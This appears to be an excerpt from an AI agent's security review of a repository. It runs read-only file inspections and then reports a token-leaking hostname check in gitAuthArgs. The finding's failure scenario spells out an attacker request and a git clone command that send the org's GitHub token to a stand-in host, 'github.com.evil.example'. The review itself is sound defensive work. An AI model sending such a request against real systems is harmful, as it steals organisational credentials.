content.text: I'll start by reading the two files named in the issue.

input.description: Show git-auth.ts and worktree.ts with line numbers
List all tracked files outside node_modules and .git
Find every reference to remoteUrl, cloneRepo, gitAuthArgs, token, and URL parsing

input.command: cat -n src/config.ts 2>/dev/null; echo ---- ; ls -la src; echo ----; cat package.json 2>/dev/null; echo ----; git status --short; git log --oneline -3
input.description: Show config.ts, src listing, package.json, and git state
Show the routes file that handles repo registration

input.reason: gitAuthArgs in src/git-auth.ts:8 decides whether to attach the GitHub service token using `remoteUrl.includes("github.com")`, a plain substring test on the whole URL rather than a check of the parsed hostname. Any URL containing that substring anywhere (subdomain, path, or query) passes, e.g. `https://github.com.evil.example/x.git`. The header it returns (line 9) is the unscoped `http.extraHeader=Authorization: Bearer <token>`, which git sends to every host it contacts in that invocation. cloneRepo in src/worktree.ts:15 feeds the user-supplied `repo.remoteUrl` straight into gitAuthArgs together with SERVICE_TOKEN (the HARBOR_GITHUB_TOKEN env var, src/config.ts:4) and then runs `git clone <remoteUrl>`. The only caller, registerRepo in src/routes.ts:19-22, takes `remoteUrl` from `req.body`, checks only that it is non-empty, and has no admin gate (contrast auditLog at line 43). A repo-wide grep shows no URL parsing, hostname allow-list, or tests anywhere that would block this. All three findings describe this same defect from the callee and caller side.
input.failure_scenario: An authenticated user calls registerRepo (src/routes.ts:18) with body `{ id: "x", remoteUrl: "https://github.com.evil.example/x.git" }`. Line 20 passes (both fields non-empty). cloneRepo (src/worktree.ts:15) calls gitAuthArgs, whose `includes("github.com")` check at src/git-auth.ts:8 matches the attacker's subdomain, so git runs `git -c http.extraHeader=Authorization: Bearer <HARBOR_GITHUB_TOKEN> clone https://github.com.evil.example/x.git ...`. Git sends the Authorization header to the attacker's server, which logs the organisation's GitHub service token.
input.severity_reason: This is a directly exploitable credential exfiltration: any user who can hit the unprivileged registerRepo route obtains the org-wide GitHub service token (HARBOR_GITHUB_TOKEN) with a single request and no special access, giving them whatever that token can reach (typically private repositories and write access). The bypass requires no race or unusual state, and the repository has no validation or tests that would catch it.
